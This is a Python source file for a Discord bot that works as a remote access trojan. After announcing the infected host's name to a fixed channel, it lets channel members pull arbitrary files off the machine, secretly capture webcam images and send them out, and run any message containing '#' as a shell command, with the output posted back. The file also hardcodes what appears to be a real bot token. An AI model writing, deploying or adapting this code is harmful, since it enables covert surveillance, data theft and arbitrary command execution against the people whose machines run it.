import discord
from discord.ext import commands
import subprocess as sp
import os ,time
from discord import message
from discord import user
import cv2


bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())


@bot.event
async def on_ready():
    print('Bot is online and ready.')
    channel = bot.get_channel(1223563228785934408)  
    if channel:
        status = str(sp.getoutput("uname -n"))
        await channel.send(status + " is online")

#-------------------------------------------


def capture_image():
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not open camera.")
        return
    ret, frame = cap.read()
    if not ret:
        print("Error: Could not capture frame.")
        cap.release()
        return
    cv2.imwrite('captured_image.jpg', frame)
    cap.release()

@bot.command()
async def menu(ctx):
    help_message = """Available commands:
    !download [file_path]: Download a file from the server.
    !delete [num_messages]: Delete a specified number of messages.
    !capture_image: Capture an image from the camera.
    !download_img: Download the captured image.
    linux_command # <- for run shell command ex ls #
    """
    await ctx.send(help_message)


@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.content.startswith('!download'):
        # Extract the file path from the message
        file_path = message.content.split(' ')[1]
        # Check if the file exists
        if os.path.exists(file_path):
            # Upload the file to the server
            with open(file_path, 'rb') as file:
                await message.channel.send(file=discord.File(file))
        else:
            await message.channel.send("File not found.")

    if message.content.startswith('!delete'):
        try:
            num_messages = int(message.content.split()[1])
        except IndexError:
            num_messages = 1  
        async for msg in message.channel.history(limit=num_messages+1):  
            await msg.delete()

    if message.content.startswith('!capture_image'):
        capture_image()
        await message.channel.send("Image captured.")  
   
    if message.content.startswith('!download_img'):
        channel = bot.get_channel(1223563228785934408)  
        if channel:
            await channel.send(file=discord.File('captured_image.jpg')) 
        else:
            print("Error: Channel not found.")

    if "#" in message.content:
        channel = bot.get_channel(1223563228785934408)
        status = str(sp.getoutput(f"{message.content}"))
        await channel.send(status)
    await bot.process_commands(message)


#------------------------------------------------------

bot.run('MTIyMzU4MDcyNTUzNDc4OTY2Mw.G3h7hR.Cl3l0EQ_wzGrDtDPs0mt2p78a5L1r6qK5JGZhU')
